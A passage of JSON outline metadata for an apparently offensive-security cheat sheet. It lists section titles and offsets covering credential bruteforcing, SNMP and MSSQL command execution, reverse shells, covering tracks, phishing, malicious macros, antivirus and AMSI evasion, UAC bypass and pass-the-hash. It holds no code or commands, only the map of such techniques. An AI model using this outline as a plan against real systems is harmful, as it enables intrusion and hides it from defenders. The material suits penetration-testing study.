Credential Bruteforcing","ident_utf16":{"start":{"line_number":1595,"utf16_col":4},"end":{"line_number":1595,"utf16_col":38}},"extent_utf16":{"start":{"line_number":1595,"utf16_col":0},"end":{"line_number":1602,"utf16_col":0}}},{"name":"2.12.2 Interacting with SMB","kind":"section_3","ident_start":51499,"ident_end":51526,"extent_start":51495,"extent_end":52537,"fully_qualified_name":"2.12.2 Interacting with SMB","ident_utf16":{"start":{"line_number":1602,"utf16_col":4},"end":{"line_number":1602,"utf16_col":31}},"extent_utf16":{"start":{"line_number":1602,"utf16_col":0},"end":{"line_number":1633,"utf16_col":0}}},{"name":"2.13 SNMP(s) - 161,162,10161,10162","kind":"section_2","ident_start":52540,"ident_end":52574,"extent_start":52537,"extent_end":57772,"fully_qualified_name":"2.13 SNMP(s) - 161,162,10161,10162","ident_utf16":{"start":{"line_number":1633,"utf16_col":3},"end":{"line_number":1633,"utf16_col":37}},"extent_utf16":{"start":{"line_number":1633,"utf16_col":0},"end":{"line_number":1778,"utf16_col":0}}},{"name":"2.13.1 Exploring MIBs with `snmptranslate`","kind":"section_3","ident_start":55145,"ident_end":55187,"extent_start":55141,"extent_end":56699,"fully_qualified_name":"2.13.1 Exploring MIBs with `snmptranslate`","ident_utf16":{"start":{"line_number":1710,"utf16_col":4},"end":{"line_number":1710,"utf16_col":46}},"extent_utf16":{"start":{"line_number":1710,"utf16_col":0},"end":{"line_number":1757,"utf16_col":0}}},{"name":"2.13.2 RCE with SNMP","kind":"section_3","ident_start":56703,"ident_end":56723,"extent_start":56699,"extent_end":57772,"fully_qualified_name":"2.13.2 RCE with SNMP","ident_utf16":{"start":{"line_number":1757,"utf16_col":4},"end":{"line_number":1757,"utf16_col":24}},"extent_utf16":{"start":{"line_number":1757,"utf16_col":0},"end":{"line_number":1778,"utf16_col":0}}},{"name":"2.14 LDAP(s) - 389,636","kind":"section_2","ident_start":57775,"ident_end":57797,"extent_start":57772,"extent_end":57807,"fully_qualified_name":"2.14 LDAP(s) - 389,636","ident_utf16":{"start":{"line_number":1778,"utf16_col":3},"end":{"line_number":1778,"utf16_col":25}},"extent_utf16":{"start":{"line_number":1778,"utf16_col":0},"end":{"line_number":1784,"utf16_col":0}}},{"name":"2.15 MSSQL - 1443","kind":"section_2","ident_start":57810,"ident_end":57827,"extent_start":57807,"extent_end":62982,"fully_qualified_name":"2.15 MSSQL - 1443","ident_utf16":{"start":{"line_number":1784,"utf16_col":3},"end":{"line_number":1784,"utf16_col":20}},"extent_utf16":{"start":{"line_number":1784,"utf16_col":0},"end":{"line_number":1936,"utf16_col":0}}},{"name":"2.15.1 MSSQL Credential Bruteforcing","kind":"section_3","ident_start":58780,"ident_end":58816,"extent_start":58776,"extent_end":59490,"fully_qualified_name":"2.15.1 MSSQL Credential Bruteforcing","ident_utf16":{"start":{"line_number":1804,"utf16_col":4},"end":{"line_number":1804,"utf16_col":40}},"extent_utf16":{"start":{"line_number":1804,"utf16_col":0},"end":{"line_number":1817,"utf16_col":0}}},{"name":"2.15.2 MSSQL Interaction","kind":"section_3","ident_start":59494,"ident_end":59518,"extent_start":59490,"extent_end":61638,"fully_qualified_name":"2.15.2 MSSQL Interaction","ident_utf16":{"start":{"line_number":1817,"utf16_col":4},"end":{"line_number":1817,"utf16_col":28}},"extent_utf16":{"start":{"line_number":1817,"utf16_col":0},"end":{"line_number":1886,"utf16_col":0}}},{"name":"2.15.3 MSSQL Command Execution","kind":"section_3","ident_start":61642,"ident_end":61672,"extent_start":61638,"extent_end":62982,"fully_qualified_name":"2.15.3 MSSQL Command Execution","ident_utf16":{"start":{"line_number":1886,"utf16_col":4},"end":{"line_number":1886,"utf16_col":34}},"extent_utf16":{"start":{"line_number":1886,"utf16_col":0},"end":{"line_number":1936,"utf16_col":0}}},{"name":"2.16 NFS - 2049","kind":"section_2","ident_start":62985,"ident_end":63000,"extent_start":62982,"extent_end":64459,"fully_qualified_name":"2.16 NFS - 2049","ident_utf16":{"start":{"line_number":1936,"utf16_col":3},"end":{"line_number":1936,"utf16_col":18}},"extent_utf16":{"start":{"line_number":1936,"utf16_col":0},"end":{"line_number":1980,"utf16_col":0}}},{"name":"2.17 MySQL - 3306","kind":"section_2","ident_start":64462,"ident_end":64479,"extent_start":64459,"extent_end":69436,"fully_qualified_name":"2.17 MySQL - 3306","ident_utf16":{"start":{"line_number":1980,"utf16_col":3},"end":{"line_number":1980,"utf16_col":20}},"extent_utf16":{"start":{"line_number":1980,"utf16_col":0},"end":{"line_number":2145,"utf16_col":0}}},{"name":"2.17.1 MySQL UDF Exploit","kind":"section_3","ident_start":66714,"ident_end":66738,"extent_start":66710,"extent_end":68727,"fully_qualified_name":"2.17.1 MySQL UDF Exploit","ident_utf16":{"start":{"line_number":2058,"utf16_col":4},"end":{"line_number":2058,"utf16_col":28}},"extent_utf16":{"start":{"line_number":2058,"utf16_col":0},"end":{"line_number":2111,"utf16_col":0}}},{"name":"2.17.2 Grabbing MySQL Passwords","kind":"section_3","ident_start":68731,"ident_end":68762,"extent_start":68727,"extent_end":69039,"fully_qualified_name":"2.17.2 Grabbing MySQL Passwords","ident_utf16":{"start":{"line_number":2111,"utf16_col":4},"end":{"line_number":2111,"utf16_col":35}},"extent_utf16":{"start":{"line_number":2111,"utf16_col":0},"end":{"line_number":2121,"utf16_col":0}}},{"name":"2.17.3 Useful MySQL Files","kind":"section_3","ident_start":69043,"ident_end":69068,"extent_start":69039,"extent_end":69436,"fully_qualified_name":"2.17.3 Useful MySQL Files","ident_utf16":{"start":{"line_number":2121,"utf16_col":4},"end":{"line_number":2121,"utf16_col":29}},"extent_utf16":{"start":{"line_number":2121,"utf16_col":0},"end":{"line_number":2145,"utf16_col":0}}},{"name":"2.18 RDP - 3389","kind":"section_2","ident_start":69439,"ident_end":69454,"extent_start":69436,"extent_end":70690,"fully_qualified_name":"2.18 RDP - 3389","ident_utf16":{"start":{"line_number":2145,"utf16_col":3},"end":{"line_number":2145,"utf16_col":18}},"extent_utf16":{"start":{"line_number":2145,"utf16_col":0},"end":{"line_number":2187,"utf16_col":0}}},{"name":"2.19 PostgreSQL - 5432","kind":"section_2","ident_start":70693,"ident_end":70715,"extent_start":70690,"extent_end":73717,"fully_qualified_name":"2.19 PostgreSQL - 5432","ident_utf16":{"start":{"line_number":2187,"utf16_col":3},"end":{"line_number":2187,"utf16_col":25}},"extent_utf16":{"start":{"line_number":2187,"utf16_col":0},"end":{"line_number":2285,"utf16_col":0}}},{"name":"2.20 VNC - 5900,5800","kind":"section_2","ident_start":73720,"ident_end":73740,"extent_start":73717,"extent_end":74409,"fully_qualified_name":"2.20 VNC - 5900,5800","ident_utf16":{"start":{"line_number":2285,"utf16_col":3},"end":{"line_number":2285,"utf16_col":23}},"extent_utf16":{"start":{"line_number":2285,"utf16_col":0},"end":{"line_number":2305,"utf16_col":0}}},{"name":"2.21 MongoDB - 27017","kind":"section_2","ident_start":74412,"ident_end":74432,"extent_start":74409,"extent_end":75941,"fully_qualified_name":"2.21 MongoDB - 27017","ident_utf16":{"start":{"line_number":2305,"utf16_col":3},"end":{"line_number":2305,"utf16_col":23}},"extent_utf16":{"start":{"line_number":2305,"utf16_col":0},"end":{"line_number":2362,"utf16_col":0}}},{"name":"2.22 Amazon Web Services (AWS) S3 Buckets","kind":"section_2","ident_start":75944,"ident_end":75985,"extent_start":75941,"extent_end":79726,"fully_qualified_name":"2.22 Amazon Web Services (AWS) S3 Buckets","ident_utf16":{"start":{"line_number":2362,"utf16_col":3},"end":{"line_number":2362,"utf16_col":44}},"extent_utf16":{"start":{"line_number":2362,"utf16_col":0},"end":{"line_number":2466,"utf16_col":0}}},{"name":"2.22.1 AWS Identity and Access Management (IAM)","kind":"section_3","ident_start":76977,"ident_end":77024,"extent_start":76973,"extent_end":79726,"fully_qualified_name":"2.22.1 AWS Identity and Access Management (IAM)","ident_utf16":{"start":{"line_number":2395,"utf16_col":4},"end":{"line_number":2395,"utf16_col":51}},"extent_utf16":{"start":{"line_number":2395,"utf16_col":0},"end":{"line_number":2466,"utf16_col":0}}},{"name":"2.22.1.1 IAM Access Keys","kind":"section_4","ident_start":77365,"ident_end":77389,"extent_start":77360,"extent_end":77962,"fully_qualified_name":"2.22.1.1 IAM Access Keys","ident_utf16":{"start":{"line_number":2400,"utf16_col":5},"end":{"line_number":2400,"utf16_col":29}},"extent_utf16":{"start":{"line_number":2400,"utf16_col":0},"end":{"line_number":2415,"utf16_col":0}}},{"name":"2.22.1.2 Conducting Reconnaissance with IAM","kind":"section_4","ident_start":77967,"ident_end":78010,"extent_start":77962,"extent_end":79451,"fully_qualified_name":"2.22.1.2 Conducting Reconnaissance with IAM","ident_utf16":{"start":{"line_number":2415,"utf16_col":5},"end":{"line_number":2415,"utf16_col":48}},"extent_utf16":{"start":{"line_number":2415,"utf16_col":0},"end":{"line_number":2453,"utf16_col":0}}},{"name":"2.22.1.3 AWS ARNs","kind":"section_4","ident_start":79456,"ident_end":79473,"extent_start":79451,"extent_end":79726,"fully_qualified_name":"2.22.1.3 AWS ARNs","ident_utf16":{"start":{"line_number":2453,"utf16_col":5},"end":{"line_number":2453,"utf16_col":22}},"extent_utf16":{"start":{"line_number":2453,"utf16_col":0},"end":{"line_number":2466,"utf16_col":0}}},{"name":"3 Exploitation","kind":"section_1","ident_start":79728,"ident_end":79742,"extent_start":79726,"extent_end":116850,"fully_qualified_name":"3 Exploitation","ident_utf16":{"start":{"line_number":2466,"utf16_col":2},"end":{"line_number":2466,"utf16_col":16}},"extent_utf16":{"start":{"line_number":2466,"utf16_col":0},"end":{"line_number":3526,"utf16_col":0}}},{"name":"3.1 Searchsploit","kind":"section_2","ident_start":79747,"ident_end":79763,"extent_start":79744,"extent_end":79976,"fully_qualified_name":"3.1 Searchsploit","ident_utf16":{"start":{"line_number":2468,"utf16_col":3},"end":{"line_number":2468,"utf16_col":19}},"extent_utf16":{"start":{"line_number":2468,"utf16_col":0},"end":{"line_number":2477,"utf16_col":0}}},{"name":"3.2 Cracking Password Hashes","kind":"section_2","ident_start":79979,"ident_end":80007,"extent_start":79976,"extent_end":88709,"fully_qualified_name":"3.2 Cracking Password Hashes","ident_utf16":{"start":{"line_number":2477,"utf16_col":3},"end":{"line_number":2477,"utf16_col":31}},"extent_utf16":{"start":{"line_number":2477,"utf16_col":0},"end":{"line_number":2733,"utf16_col":0}}},{"name":"3.2.1 Identifying Unknown Hash Format","kind":"section_3","ident_start":80130,"ident_end":80167,"extent_start":80126,"extent_end":81099,"fully_qualified_name":"3.2.1 Identifying Unknown Hash Format","ident_utf16":{"start":{"line_number":2486,"utf16_col":4},"end":{"line_number":2486,"utf16_col":41}},"extent_utf16":{"start":{"line_number":2486,"utf16_col":0},"end":{"line_number":2508,"utf16_col":0}}},{"name":"3.2.2 Cracking with John The Ripper","kind":"section_3","ident_start":81103,"ident_end":81138,"extent_start":81099,"extent_end":82710,"fully_qualified_name":"3.2.2 Cracking with John The Ripper","ident_utf16":{"start":{"line_number":2508,"utf16_col":4},"end":{"line_number":2508,"utf16_col":39}},"extent_utf16":{"start":{"line_number":2508,"utf16_col":0},"end":{"line_number":2565,"utf16_col":0}}},{"name":"3.2.3 Cracking with Hashcat","kind":"section_3","ident_start":82714,"ident_end":82741,"extent_start":82710,"extent_end":85855,"fully_qualified_name":"3.2.3 Cracking with Hashcat","ident_utf16":{"start":{"line_number":2565,"utf16_col":4},"end":{"line_number":2565,"utf16_col":31}},"extent_utf16":{"start":{"line_number":2565,"utf16_col":0},"end":{"line_number":2635,"utf16_col":0}}},{"name":"3.2.4 Making Custom Wordlists","kind":"section_3","ident_start":85859,"ident_end":85888,"extent_start":85855,"extent_end":88123,"fully_qualified_name":"3.2.4 Making Custom Wordlists","ident_utf16":{"start":{"line_number":2635,"utf16_col":4},"end":{"line_number":2635,"utf16_col":33}},"extent_utf16":{"start":{"line_number":2635,"utf16_col":0},"end":{"line_number":2704,"utf16_col":0}}},{"name":"3.2.5 Password Cracking Examples","kind":"section_3","ident_start":88127,"ident_end":88159,"extent_start":88123,"extent_end":88709,"fully_qualified_name":"3.2.5 Password Cracking Examples","ident_utf16":{"start":{"line_number":2704,"utf16_col":4},"end":{"line_number":2704,"utf16_col":36}},"extent_utf16":{"start":{"line_number":2704,"utf16_col":0},"end":{"line_number":2733,"utf16_col":0}}},{"name":"3.3 Reverse Shells","kind":"section_2","ident_start":88712,"ident_end":88730,"extent_start":88709,"extent_end":97923,"fully_qualified_name":"3.3 Reverse Shells","ident_utf16":{"start":{"line_number":2733,"utf16_col":3},"end":{"line_number":2733,"utf16_col":21}},"extent_utf16":{"start":{"line_number":2733,"utf16_col":0},"end":{"line_number":3017,"utf16_col":0}}},{"name":"3.3.1 Running a detached/daemonized process on Linux","kind":"section_3","ident_start":95901,"ident_end":95953,"extent_start":95897,"extent_end":96363,"fully_qualified_name":"3.3.1 Running a detached/daemonized process on Linux","ident_utf16":{"start":{"line_number":2948,"utf16_col":4},"end":{"line_number":2948,"utf16_col":56}},"extent_utf16":{"start":{"line_number":2948,"utf16_col":0},"end":{"line_number":2961,"utf16_col":0}}},{"name":"3.3.2 Covering your tracks","kind":"section_3","ident_start":96367,"ident_end":96393,"extent_start":96363,"extent_end":96960,"fully_qualified_name":"3.3.2 Covering your tracks","ident_utf16":{"start":{"line_number":2961,"utf16_col":4},"end":{"line_number":2961,"utf16_col":30}},"extent_utf16":{"start":{"line_number":2961,"utf16_col":0},"end":{"line_number":2984,"utf16_col":0}}},{"name":"3.3.3 Upgrading to Interactive Shell","kind":"section_3","ident_start":96964,"ident_end":97000,"extent_start":96960,"extent_end":97923,"fully_qualified_name":"3.3.3 Upgrading to Interactive Shell","ident_utf16":{"start":{"line_number":2984,"utf16_col":4},"end":{"line_number":2984,"utf16_col":40}},"extent_utf16":{"start":{"line_number":2984,"utf16_col":0},"end":{"line_number":3017,"utf16_col":0}}},{"name":"3.4 Metasploit","kind":"section_2","ident_start":97926,"ident_end":97940,"extent_start":97923,"extent_end":106920,"fully_qualified_name":"3.4 Metasploit","ident_utf16":{"start":{"line_number":3017,"utf16_col":3},"end":{"line_number":3017,"utf16_col":17}},"extent_utf16":{"start":{"line_number":3017,"utf16_col":0},"end":{"line_number":3258,"utf16_col":0}}},{"name":"3.4.1 Interacting with Metasploit via `msfconsole`","kind":"section_3","ident_start":98618,"ident_end":98668,"extent_start":98614,"extent_end":102632,"fully_qualified_name":"3.4.1 Interacting with Metasploit via `msfconsole`","ident_utf16":{"start":{"line_number":3039,"utf16_col":4},"end":{"line_number":3039,"utf16_col":54}},"extent_utf16":{"start":{"line_number":3039,"utf16_col":0},"end":{"line_number":3167,"utf16_col":0}}},{"name":"3.4.2 Metasploit Resource Scripts","kind":"section_3","ident_start":102636,"ident_end":102669,"extent_start":102632,"extent_end":103756,"fully_qualified_name":"3.4.2 Metasploit Resource Scripts","ident_utf16":{"start":{"line_number":3167,"utf16_col":4},"end":{"line_number":3167,"utf16_col":37}},"extent_utf16":{"start":{"line_number":3167,"utf16_col":0},"end":{"line_number":3196,"utf16_col":0}}},{"name":"3.4.3 Meterpreter command basics","kind":"section_3","ident_start":103760,"ident_end":103792,"extent_start":103756,"extent_end":105240,"fully_qualified_name":"3.4.3 Meterpreter command basics","ident_utf16":{"start":{"line_number":3196,"utf16_col":4},"end":{"line_number":3196,"utf16_col":36}},"extent_utf16":{"start":{"line_number":3196,"utf16_col":0},"end":{"line_number":3237,"utf16_col":0}}},{"name":"3.4.4 Metasploit Modules and Payloads","kind":"section_3","ident_start":105244,"ident_end":105281,"extent_start":105240,"extent_end":106920,"fully_qualified_name":"3.4.4 Metasploit Modules and Payloads","ident_utf16":{"start":{"line_number":3237,"utf16_col":4},"end":{"line_number":3237,"utf16_col":41}},"extent_utf16":{"start":{"line_number":3237,"utf16_col":0},"end":{"line_number":3258,"utf16_col":0}}},{"name":"3.5 Buffer Overflows","kind":"section_2","ident_start":106923,"ident_end":106943,"extent_start":106920,"extent_end":108364,"fully_qualified_name":"3.5 Buffer Overflows","ident_utf16":{"start":{"line_number":3258,"utf16_col":3},"end":{"line_number":3258,"utf16_col":23}},"extent_utf16":{"start":{"line_number":3258,"utf16_col":0},"end":{"line_number":3303,"utf16_col":0}}},{"name":"3.6 Client-Side Attacks","kind":"section_2","ident_start":108367,"ident_end":108390,"extent_start":108364,"extent_end":116850,"fully_qualified_name":"3.6 Client-Side Attacks","ident_utf16":{"start":{"line_number":3303,"utf16_col":3},"end":{"line_number":3303,"utf16_col":26}},"extent_utf16":{"start":{"line_number":3303,"utf16_col":0},"end":{"line_number":3526,"utf16_col":0}}},{"name":"3.6.1 Phishing Emails","kind":"section_3","ident_start":108396,"ident_end":108417,"extent_start":108392,"extent_end":109495,"fully_qualified_name":"3.6.1 Phishing Emails","ident_utf16":{"start":{"line_number":3305,"utf16_col":4},"end":{"line_number":3305,"utf16_col":25}},"extent_utf16":{"start":{"line_number":3305,"utf16_col":0},"end":{"line_number":3335,"utf16_col":0}}},{"name":"3.6.2 HTA Files","kind":"section_3","ident_start":109499,"ident_end":109514,"extent_start":109495,"extent_end":110698,"fully_qualified_name":"3.6.2 HTA Files","ident_utf16":{"start":{"line_number":3335,"utf16_col":4},"end":{"line_number":3335,"utf16_col":19}},"extent_utf16":{"start":{"line_number":3335,"utf16_col":0},"end":{"line_number":3370,"utf16_col":0}}},{"name":"3.6.3 Malicious Office Macros","kind":"section_3","ident_start":110702,"ident_end":110731,"extent_start":110698,"extent_end":112161,"fully_qualified_name":"3.6.3 Malicious Office Macros","ident_utf16":{"start":{"line_number":3370,"utf16_col":4},"end":{"line_number":3370,"utf16_col":33}},"extent_utf16":{"start":{"line_number":3370,"utf16_col":0},"end":{"line_number":3419,"utf16_col":0}}},{"name":"3.6.4 Windows Library Files","kind":"section_3","ident_start":112165,"ident_end":112192,"extent_start":112161,"extent_end":116850,"fully_qualified_name":"3.6.4 Windows Library Files","ident_utf16":{"start":{"line_number":3419,"utf16_col":4},"end":{"line_number":3419,"utf16_col":31}},"extent_utf16":{"start":{"line_number":3419,"utf16_col":0},"end":{"line_number":3526,"utf16_col":0}}},{"name":"4 Windows","kind":"section_1","ident_start":116852,"ident_end":116861,"extent_start":116850,"extent_end":183801,"fully_qualified_name":"4 Windows","ident_utf16":{"start":{"line_number":3526,"utf16_col":2},"end":{"line_number":3526,"utf16_col":11}},"extent_utf16":{"start":{"line_number":3526,"utf16_col":0},"end":{"line_number":5355,"utf16_col":0}}},{"name":"4.1 Basic Windows Post-Exploit Enumeration","kind":"section_2","ident_start":116866,"ident_end":116908,"extent_start":116863,"extent_end":128741,"fully_qualified_name":"4.1 Basic Windows Post-Exploit Enumeration","ident_utf16":{"start":{"line_number":3528,"utf16_col":3},"end":{"line_number":3528,"utf16_col":45}},"extent_utf16":{"start":{"line_number":3528,"utf16_col":0},"end":{"line_number":3826,"utf16_col":0}}},{"name":"4.1.1 Watching for Windows Process to run","kind":"section_3","ident_start":127289,"ident_end":127330,"extent_start":127285,"extent_end":128741,"fully_qualified_name":"4.1.1 Watching for Windows Process to run","ident_utf16":{"start":{"line_number":3792,"utf16_col":4},"end":{"line_number":3792,"utf16_col":45}},"extent_utf16":{"start":{"line_number":3792,"utf16_col":0},"end":{"line_number":3826,"utf16_col":0}}},{"name":"4.2 Windows Privilege Escalation","kind":"section_2","ident_start":128744,"ident_end":128776,"extent_start":128741,"extent_end":153651,"fully_qualified_name":"4.2 Windows Privilege Escalation","ident_utf16":{"start":{"line_number":3826,"utf16_col":3},"end":{"line_number":3826,"utf16_col":35}},"extent_utf16":{"start":{"line_number":3826,"utf16_col":0},"end":{"line_number":4490,"utf16_col":0}}},{"name":"4.2.1 Check Windows File Permissions","kind":"section_3","ident_start":133686,"ident_end":133722,"extent_start":133682,"extent_end":134276,"fully_qualified_name":"4.2.1 Check Windows File Permissions","ident_utf16":{"start":{"line_number":3909,"utf16_col":4},"end":{"line_number":3909,"utf16_col":40}},"extent_utf16":{"start":{"line_number":3909,"utf16_col":0},"end":{"line_number":3929,"utf16_col":0}}},{"name":"4.2.2 Windows Service Escalation - Registry","kind":"section_3","ident_start":134280,"ident_end":134323,"extent_start":134276,"extent_end":137118,"fully_qualified_name":"4.2.2 Windows Service Escalation - Registry","ident_utf16":{"start":{"line_number":3929,"utf16_col":4},"end":{"line_number":3929,"utf16_col":47}},"extent_utf16":{"start":{"line_number":3929,"utf16_col":0},"end":{"line_number":4040,"utf16_col":0}}},{"name":"4.2.3 Windows Binary Hijacking","kind":"section_3","ident_start":137122,"ident_end":137152,"extent_start":137118,"extent_end":141682,"fully_qualified_name":"4.2.3 Windows Binary Hijacking","ident_utf16":{"start":{"line_number":4040,"utf16_col":4},"end":{"line_number":4040,"utf16_col":34}},"extent_utf16":{"start":{"line_number":4040,"utf16_col":0},"end":{"line_number":4170,"utf16_col":0}}},{"name":"4.2.4 Windows DLL Hijacking","kind":"section_3","ident_start":141686,"ident_end":141713,"extent_start":141682,"extent_end":146493,"fully_qualified_name":"4.2.4 Windows DLL Hijacking","ident_utf16":{"start":{"line_number":4170,"utf16_col":4},"end":{"line_number":4170,"utf16_col":31}},"extent_utf16":{"start":{"line_number":4170,"utf16_col":0},"end":{"line_number":4295,"utf16_col":0}}},{"name":"4.2.5 Unquoted Windows Service Paths","kind":"section_3","ident_start":146497,"ident_end":146533,"extent_start":146493,"extent_end":148909,"fully_qualified_name":"4.2.5 Unquoted Windows Service Paths","ident_utf16":{"start":{"line_number":4295,"utf16_col":4},"end":{"line_number":4295,"utf16_col":40}},"extent_utf16":{"start":{"line_number":4295,"utf16_col":0},"end":{"line_number":4361,"utf16_col":0}}},{"name":"4.2.6 Windows Token Impersonation","kind":"section_3","ident_start":148913,"ident_end":148946,"extent_start":148909,"extent_end":151722,"fully_qualified_name":"4.2.6 Windows Token Impersonation","ident_utf16":{"start":{"line_number":4361,"utf16_col":4},"end":{"line_number":4361,"utf16_col":37}},"extent_utf16":{"start":{"line_number":4361,"utf16_col":0},"end":{"line_number":4443,"utf16_col":0}}},{"name":"4.2.6.1 Windows Token Impersonation with GodPotato","kind":"section_4","ident_start":149333,"ident_end":149383,"extent_start":149328,"extent_end":150341,"fully_qualified_name":"4.2.6.1 Windows Token Impersonation with GodPotato","ident_utf16":{"start":{"line_number":4367,"utf16_col":5},"end":{"line_number":4367,"utf16_col":55}},"extent_utf16":{"start":{"line_number":4367,"utf16_col":0},"end":{"line_number":4396,"utf16_col":0}}},{"name":"4.2.6.2 Windows Token Impersonation with PrintSpoofer","kind":"section_4","ident_start":150346,"ident_end":150399,"extent_start":150341,"extent_end":150770,"fully_qualified_name":"4.2.6.2 Windows Token Impersonation with PrintSpoofer","ident_utf16":{"start":{"line_number":4396,"utf16_col":5},"end":{"line_number":4396,"utf16_col":58}},"extent_utf16":{"start":{"line_number":4396,"utf16_col":0},"end":{"line_number":4414,"utf16_col":0}}},{"name":"4.2.6.3 Windows Token Impersonation with RoguePotato","kind":"section_4","ident_start":150775,"ident_end":150827,"extent_start":150770,"extent_end":151722,"fully_qualified_name":"4.2.6.3 Windows Token Impersonation with RoguePotato","ident_utf16":{"start":{"line_number":4414,"utf16_col":5},"end":{"line_number":4414,"utf16_col":57}},"extent_utf16":{"start":{"line_number":4414,"utf16_col":0},"end":{"line_number":4443,"utf16_col":0}}},{"name":"4.2.7 Windows Pass-The-Hash Attacks","kind":"section_3","ident_start":151726,"ident_end":151761,"extent_start":151722,"extent_end":152912,"fully_qualified_name":"4.2.7 Windows Pass-The-Hash Attacks","ident_utf16":{"start":{"line_number":4443,"utf16_col":4},"end":{"line_number":4443,"utf16_col":39}},"extent_utf16":{"start":{"line_number":4443,"utf16_col":0},"end":{"line_number":4475,"utf16_col":0}}},{"name":"4.2.8 Windows NTLMv2 Hash Relay Attack","kind":"section_3","ident_start":152916,"ident_end":152954,"extent_start":152912,"extent_end":153651,"fully_qualified_name":"4.2.8 Windows NTLMv2 Hash Relay Attack","ident_utf16":{"start":{"line_number":4475,"utf16_col":4},"end":{"line_number":4475,"utf16_col":42}},"extent_utf16":{"start":{"line_number":4475,"utf16_col":0},"end":{"line_number":4490,"utf16_col":0}}},{"name":"4.3 Antivirus \u0026 Firewall Evasion","kind":"section_2","ident_start":153654,"ident_end":153686,"extent_start":153651,"extent_end":165949,"fully_qualified_name":"4.3 Antivirus \u0026 Firewall Evasion","ident_utf16":{"start":{"line_number":4490,"utf16_col":3},"end":{"line_number":4490,"utf16_col":35}},"extent_utf16":{"start":{"line_number":4490,"utf16_col":0},"end":{"line_number":4839,"utf16_col":0}}},{"name":"4.3.1 Cross-Compiling Windows Binaries on Linux","kind":"section_3","ident_start":153984,"ident_end":154031,"extent_start":153980,"extent_end":154414,"fully_qualified_name":"4.3.1 Cross-Compiling Windows Binaries on Linux","ident_utf16":{"start":{"line_number":4497,"utf16_col":4},"end":{"line_number":4497,"utf16_col":51}},"extent_utf16":{"start":{"line_number":4497,"utf16_col":0},"end":{"line_number":4513,"utf16_col":0}}},{"name":"4.3.2 Shellter","kind":"section_3","ident_start":154418,"ident_end":154432,"extent_start":154414,"extent_end":155091,"fully_qualified_name":"4.3.2 Shellter","ident_utf16":{"start":{"line_number":4513,"utf16_col":4},"end":{"line_number":4513,"utf16_col":18}},"extent_utf16":{"start":{"line_number":4513,"utf16_col":0},"end":{"line_number":4531,"utf16_col":0}}},{"name":"4.3.3 Windows Process Injection","kind":"section_3","ident_start":155095,"ident_end":155126,"extent_start":155091,"extent_end":156769,"fully_qualified_name":"4.3.3 Windows Process Injection","ident_utf16":{"start":{"line_number":4531,"utf16_col":4},"end":{"line_number":4531,"utf16_col":35}},"extent_utf16":{"start":{"line_number":4531,"utf16_col":0},"end":{"line_number":4574,"utf16_col":0}}},{"name":"4.3.4 Windows AMSI Bypass","kind":"section_3","ident_start":156773,"ident_end":156798,"extent_start":156769,"extent_end":157588,"fully_qualified_name":"4.3.4 Windows AMSI Bypass","ident_utf16":{"start":{"line_number":4574,"utf16_col":4},"end":{"line_number":4574,"utf16_col":29}},"extent_utf16":{"start":{"line_number":4574,"utf16_col":0},"end":{"line_number":4589,"utf16_col":0}}},{"name":"4.3.5 Turn off Windows Firewall","kind":"section_3","ident_start":157592,"ident_end":157623,"extent_start":157588,"extent_end":157856,"fully_qualified_name":"4.3.5 Turn off Windows Firewall","ident_utf16":{"start":{"line_number":4589,"utf16_col":4},"end":{"line_number":4589,"utf16_col":35}},"extent_utf16":{"start":{"line_number":4589,"utf16_col":0},"end":{"line_number":4602,"utf16_col":0}}},{"name":"4.3.6 Turn off Windows Defender","kind":"section_3","ident_start":157860,"ident_end":157891,"extent_start":157856,"extent_end":158950,"fully_qualified_name":"4.3.6 Turn off Windows Defender","ident_utf16":{"start":{"line_number":4602,"utf16_col":4},"end":{"line_number":4602,"utf16_col":35}},"extent_utf16":{"start":{"line_number":4602,"utf16_col":0},"end":{"line_number":4638,"utf16_col":0}}},{"name":"4.3.7 Windows Encoding/Decoding with LOLBAS","kind":"section_3","ident_start":158954,"ident_end":158997,"extent_start":158950,"extent_end":159305,"fully_qualified_name":"4.3.7 Windows Encoding/Decoding with LOLBAS","ident_utf16":{"start":{"line_number":4638,"utf16_col":4},"end":{"line_number":4638,"utf16_col":47}},"extent_utf16":{"start":{"line_number":4638,"utf16_col":0},"end":{"line_number":4653,"utf16_col":0}}},{"name":"4.3.8 Execute Inline Tasks with MSBuild.exe","kind":"section_3","ident_start":159309,"ident_end":159352,"extent_start":159305,"extent_end":162740,"fully_qualified_name":"4.3.8 Execute Inline Tasks with MSBuild.exe","ident_utf16":{"start":{"line_number":4653,"utf16_col":4},"end":{"line_number":4653,"utf16_col":47}},"extent_utf16":{"start":{"line_number":4653,"utf16_col":0},"end":{"line_number":4749,"utf16_col":0}}},{"name":"4.3.9 Custom Windows TCP Reverse Shell","kind":"section_3","ident_start":162744,"ident_end":162782,"extent_start":162740,"extent_end":164955,"fully_qualified_name":"4.3.9 Custom Windows TCP Reverse Shell","ident_utf16":{"start":{"line_number":4749,"utf16_col":4},"end":{"line_number":4749,"utf16_col":42}},"extent_utf16":{"start":{"line_number":4749,"utf16_col":0},"end":{"line_number":4811,"utf16_col":0}}},{"name":"4.3.10 Windows UAC Bypass","kind":"section_3","ident_start":164959,"ident_end":164984,"extent_start":164955,"extent_end":165949,"fully_qualified_name":"4.3.10 Windows UAC Bypass","ident_utf16":{"start":{"line_number":4811,"utf16_col":4},"end":{"line_number":4811,"utf16_col":29}},"extent_utf16":{"start":{"line_number":4811,"utf16_col":0},"end":{"line_number":4839,"utf16_col":0}}},{"name":"4.4 Windows Passwords \u0026 Hashes","kind":"section_2","ident_start":165952,"ident_end":165982,"extent_start":165949,"extent_end":176878,"fully_qualified_name":"4.4 Windows Passwords \u0026 Hashes","ident_utf16":{"start":{"line_number":4839,"utf16_col":3},"end":{"line_number":4839,"utf16_col":33}},"extent_utf16":{"start":{"line_number":4839,"utf16_col":0},"end":{"line_number":5148,"utf16_col":0}}},{"name":"4.4.1 Windows Passwords in Files","kind":"section_3","ident_start":166361,"ident_end":166393,"extent_start":166357,"extent_end":167981,"fully_qualified_name":"4.4.1 Windows Passwords in Files","ident_utf16":{"start":{"line_number":4849,"utf16_col":4},"end":{"line_number":4849,"utf16_col":36}},"extent_utf16":{"start":{"line_number":4849,"utf16_col":0},"end":{"line_number":4906,"utf16_col":0}}},{"name":"4.4.2 Windows Passwords in Registry","kind":"section_3","ident_start":167985,"ident_end":168020,"extent_start":167981,"extent_end":169479,"fully_qualified_name":"4.4.2 Windows Passwords in 